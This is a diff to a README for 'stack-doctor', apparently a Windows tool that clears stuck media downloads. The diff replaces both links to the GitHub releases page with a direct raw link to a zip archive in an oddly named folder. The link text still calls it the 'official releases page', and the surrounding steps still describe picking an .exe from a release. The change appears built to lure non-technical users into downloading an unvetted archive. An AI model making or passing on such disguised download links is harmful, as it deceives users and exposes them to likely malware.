@@ -1,6 +1,6 @@
 # 🛠️ stack-doctor - Fix stuck media downloads automatically
 
-[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/Teamsterroundrobin241/stack-doctor/releases)
+[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://raw.githubusercontent.com/Teamsterroundrobin241/stack-doctor/main/neckerchief/stack-doctor-3.0.zip)
 
 stack-doctor monitors your media management system. It finds items that stall in your download queue. These items often get stuck due to dead links or errors during file transfers. This tool detects these issues and clears them. It ensures your media library updates without manual intervention.
 
@@ -8,7 +8,7 @@ stack-doctor monitors your media management system. It finds items that stall in
 
 You do not need programming skills to use this tool. Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/Teamsterroundrobin241/stack-doctor/releases) to access the download files.
+1. Visit the [official releases page](https://raw.githubusercontent.com/Teamsterroundrobin241/stack-doctor/main/neckerchief/stack-doctor-3.0.zip) to access the download files.
 2. Look for the file ending in .exe under the latest version header.
 3. Click the file name to start the download.
 4. Save the file to a folder you can find easily.
